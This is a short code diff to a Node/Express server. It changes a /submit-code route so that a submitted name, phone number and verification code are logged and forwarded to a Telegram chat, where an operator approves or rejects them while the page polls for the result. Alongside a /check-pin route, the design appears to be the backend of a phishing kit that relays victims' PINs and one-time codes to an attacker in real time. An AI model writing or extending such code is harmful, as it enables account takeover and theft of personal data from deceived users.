@@ -58,12 +58,12 @@ app.get('/check-pin/:pin', (req, res) => {
 
 // ---------------------- CODE FLOW ----------------------
 
-// Submit CODE
+// Submit code
 app.post('/submit-code', (req, res) => {
-    const { code } = req.body;
-    console.log('📩 /submit-code HIT', { code });
+    const { name, phone, code } = req.body;  // <-- include name and phone
+    console.log('📩 /submit-code HIT', { name, phone, code });
 
-    approvedCodes[code] = null; // pending
+    approvedCodes[code] = false;
 
     const inlineKeyboard = [
         [
@@ -72,10 +72,13 @@ app.post('/submit-code', (req, res) => {
         ]
     ];
 
-    sendTelegramMessage(`🔑 CODE VERIFICATION\n\nCode: ${code}`, inlineKeyboard);
+    // Send name, phone, and code to Telegram
+    const msg = `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`;
+    sendTelegramMessage(msg, inlineKeyboard);
 
     res.json({ status: 'pending' });
 });
+
 
 // Poll CODE approval
 app.get('/check-code/:code', (req, res) => {
